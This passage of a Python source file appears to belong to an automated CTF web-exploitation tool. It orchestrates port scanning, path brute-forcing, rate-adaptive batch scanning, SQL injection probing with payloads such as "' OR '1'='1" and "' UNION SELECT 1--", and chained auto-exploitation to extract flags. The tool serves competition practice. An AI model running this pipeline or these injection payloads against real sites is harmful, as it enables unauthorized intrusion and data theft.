                        result["flag"] = chain_result["flag"]
                        _emit(url, "chain_flag", chain_result["flag"])
                        return result
            except Exception as e:
                _emit(url, "chain_error", str(e)[:60])

            # Phase 4: Auto exploit
            try:
                from yang_web.core.url_analyzer import auto_exploit
                fingerprint = analysis.get("fingerprint", {})
                exploit_result = auto_exploit(url, vuln_results,
                    fingerprint=fingerprint)
                result["exploit"] = exploit_result
                if exploit_result.get("flag"):
                    result["flag"] = exploit_result["flag"]
            except Exception as e:
                _emit(url, "exploit_error", str(e)[:60])

            return result

        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = {executor.submit(_process_one, url): url for url in urls}
            for future in as_completed(futures):
                url = futures[future]
                try:
                    r = future.result(timeout=120)
                    all_results.append(r)
                    if on_target_done:
                        try:
                            on_target_done(url, r)
                        except Exception:
                            pass
                except Exception:
                    all_results.append({"url": url, "error": "Timeout or exception"})

        self.results = all_results
        return all_results


# ═══════════════════════════════════════════════════════════
#  7. Smart Rate Limiter
# ═══════════════════════════════════════════════════════════

class SmartRateLimiter:
    """自适应限速器 — 检测目标响应速度并调整并发度.

    根据目标响应时间动态调整:
    - 快响应 (<100ms) → 高并发 (max 30)
    - 正常 (100-500ms) → 中并发 (max 15)
    - 慢响应 (500ms-1s) → 低并发 (max 5)
    - 超慢 (>1s) → 单线程
    - 检测到 429/503 → 退避等待
    """

    def __init__(self, initial_concurrency: int = 10):
        self.concurrency = initial_concurrency
        self.min_concurrency = 1
        self.max_concurrency = 30
        self.response_times: List[float] = []
        self.error_count = 0
        self.backoff_until = 0.0
        self.consecutive_429 = 0

    def adjust(self, response: dict):
        """Adjust concurrency based on response."""
        elapsed = response.get("elapsed_ms", 0) / 1000.0
        status = response.get("status", 0)
        self.response_times.append(elapsed)

        # Handle rate limiting
        if status == 429:
            self.consecutive_429 += 1
            self.backoff_until = time.time() + min(30, 2 ** self.consecutive_429)
            self.concurrency = max(self.min_concurrency, self.concurrency // 2)
            return
        elif status == 503:
            self.consecutive_429 += 1
            self.backoff_until = time.time() + 10
            return
        else:
            self.consecutive_429 = 0

        # Adaptive speed adjustment based on last 20 responses
        if len(self.response_times) >= 5:
            avg_time = sum(self.response_times[-20:]) / min(20, len(self.response_times))
            if avg_time < 0.1:
                self.concurrency = min(self.max_concurrency, self.concurrency + 2)
            elif avg_time < 0.5:
                self.concurrency = min(self.max_concurrency, self.concurrency + 1)
            elif avg_time > 2.0:
                self.concurrency = max(self.min_concurrency, self.concurrency - 2)
            elif avg_time > 1.0:
                self.concurrency = max(self.min_concurrency, self.concurrency - 1)

    def should_wait(self) -> float:
        """Check if we should wait before next request. Returns seconds to wait or 0."""
        if time.time() < self.backoff_until:
            return self.backoff_until - time.time()
        return 0.0

    @property
    def current_stats(self) -> dict:
        avg = sum(self.response_times[-20:]) / max(1, len(self.response_times[-20:]))
        return {
            "concurrency": self.concurrency,
            "avg_response_time": round(avg, 3),
            "error_count": self.error_count,
            "backoff": self.backoff_until > time.time(),
        }


# ═══════════════════════════════════════════════════════════
#  Unified Advanced Solver — 整合所有新引擎
# ═══════════════════════════════════════════════════════════

class AdvancedSolver:
    """统一高级求解器 — 整合所有新引擎.

    与现有SmartSolver互补:
    - SmartSolver: 多类型分类+路由 (Web/Crypto/Binary/Blockchain)
    - AdvancedSolver: Web深度扫描+升级利用 (本模块)
    """

    def __init__(self):
        self.rate_limiter = SmartRateLimiter()

    def deep_scan(self, url: str, analysis_result: dict = None,
                  on_progress=None, on_flag=None) -> dict:
        """对单个URL执行深度扫描.

        Pipeline:
        1. 端口发现 → 了解攻击面
        2. 字典扫描 → 发现隐藏路径/源码
        3. 方法自适应 → 最佳HTTP方法
        4. 响应对比 → 盲注精准检测
        5. 攻击链升级 → 二阶段利用
        6. 自动利用 → 提取Flag
        """
        t0 = time.time()
        flag = None
        stages_executed: List[str] = []

        def _emit(stage, item, status):
            stages_executed.append(f"[{stage}] {item}: {status}")
            if on_progress:
                try:
                    on_progress(stage, item, status)
                except Exception:
                    pass

        def _found(f):
            nonlocal flag
            if not flag:
                flag = f
                if on_flag:
                    try:
                        on_flag(f)
                    except Exception:
                        pass

        # Phase 1: Quick port scan
        try:
            parsed = urllib.parse.urlparse(url)
            host = parsed.hostname or "127.0.0.1"
            if host in ("127.0.0.1", "localhost", "::1"):
                _emit("ports", "skip", "本地回环地址，跳过端口扫描")
            else:
                port_scanner = QuickPortScanner(host, timeout=0.5)
                port_result = port_scanner.scan(on_progress=_emit)
                _emit("ports", f"{host}", f"开放 {port_result['open']}/{port_result['total']} 端口")
        except Exception as e:
            _emit("ports", "skip", f"端口扫描异常: {str(e)[:40]}")

        # Phase 2: Dictionary scan (L1+L2)
        scanner = DictScanner(url, max_workers=20, timeout=2, levels=[1, 2])
        scan_result = scanner.scan(on_progress=_emit, on_flag=_found)
        if scan_result.get("flag"):
            return {"success": True, "flag": flag, "source": "dict_scan",
                    "stages": stages_executed, "timing_ms": int((time.time()-t0)*1000)}
        _emit("dict_scan", "完成", f"发现 {scan_result['count']} 路径")

        # Phase 3: Method auto-switch check
        vuln_results = []  # Ensure always defined
        fingerprint = {}
        if analysis_result and isinstance(analysis_result, dict):
            vuln_results = analysis_result.get("results", []) or []
            fingerprint = analysis_result.get("fingerprint", {})
            if vuln_results:
                params = vuln_results[0].get("params", [])
                if params:
                    auto_switch = MethodAutoSwitch(url)
                    sw_result = auto_switch.try_all_methods(params[0], "test")
                    _emit("method", sw_result["best_method"], sw_result["recommendation"])

            # Phase 4: Response diffing for top vulnerability
            if vuln_results:
                top_vuln = max(vuln_results, key=lambda r: r.get("confidence", 0))
                vtype = top_vuln.get("type", "")
                params = top_vuln.get("params", [])

                if vtype == "SQLi" and params:
                    differ = ResponseDiffer(url)
                    differ.set_baseline()
                    sql_probes = ["'", '"', "' OR '1'='1", "1' AND 1=1--",
                                 "1' AND sleep(3)--", "' UNION SELECT 1--"]
                    differ.batch_test(params[0], sql_probes,
                        on_progress=_emit, on_flag=_found)

        # Phase 5: Attack chains
        if vuln_results:
            chain_engine = AttackChainEngine(url)
            chain_result = chain_engine.chain(vuln_results,
                on_progress=_emit, on_flag=_found)
            if chain_result.get("flag"):
                return {"success": True, "flag": flag, "source": "attack_chain",
                        "stages": stages_executed,
                        "timing_ms": int((time.time()-t0)*1000)}

        # Phase 6: Run existing auto_exploit as fallback
        try:
            from yang_web.core.url_analyzer import auto_exploit
            exploit_result = auto_exploit(url, vuln_results, fingerprint=fingerprint,
                on_progress=_emit, on_found=_found)
            if exploit_result.get("flag"):
                return {"success": True, "flag": flag, "source": "auto_exploit",
                        "stages": stages_executed,
                        "timing_ms": int((time.time()-t0)*1000)}
        except Exception:
            pass

        return {
            "success": bool(flag),
            "flag": flag,
            "stages": stages_executed,
            "scan_result": scan_result,
            "timing_ms": int((time.time() - t0) * 1000),
        }


# ═══════════════════════════════════════════════════════════
#  CLI
# ═══════════════════════════════════════════════════════════

if __name__ == "__main__":
    import sys, json

    if len(sys.argv) < 2:
        print("Advanced Scanner CLI")
        print("  python advanced_scanner.py scan <url>         — 深度扫描")
        print("  python advanced_scanner.py dict <url>         — 仅字典扫描")
        print("  python advanced_scanner.py ports <host>       — 端口扫描")
        print("  python advanced_scanner.py batch <url1> <url2>... — 批量处理")
        sys.exit(0)

    cmd = sys.argv[1]

    if cmd == "scan" and len(sys.argv) > 2:
        url = sys.argv[2]
        solver = AdvancedSolver()
        result = solver.deep_scan(url)
        print(json.dumps(result, ensure_ascii=False, indent=2))

    elif cmd == "dict" and len(sys.argv) > 2:
        url = sys.argv[2]
        scanner = DictScanner(url)
        result = scanner.scan()
        for p in result["paths_found"]:
            print(f"  {p['status']:>3} | {p['path']:<40} | {p.get('body_len', 0):>5}B | {p.get('title', '')[:40]}")
        print(f"\nTotal: {result['count']} paths found in {result['timing_ms']}ms")

    elif cmd == "ports" and len(sys.argv) > 2:
        host = sys.argv[2]
        scanner = QuickPortScanner(host)
        result = scanner.scan()
        for p in result["open_ports"]:
            print(f"  {p['port']:>5}/tcp  {p['service']:<15} {p.get('banner', '')}")
        print(f"\nOpen: {result['open']}/{result['total']} in {result['timing_ms']}ms")

    elif cmd == "batch":
        urls = sys.argv[2:]
        if urls:
            runner = BatchRunner()
            results = runner.run(urls)
            for r in results:
                status = "✅" if r.get("flag") else "❌"
                print(f"  {status} {r['url']}: {r.get('flag', 'no flag')}")
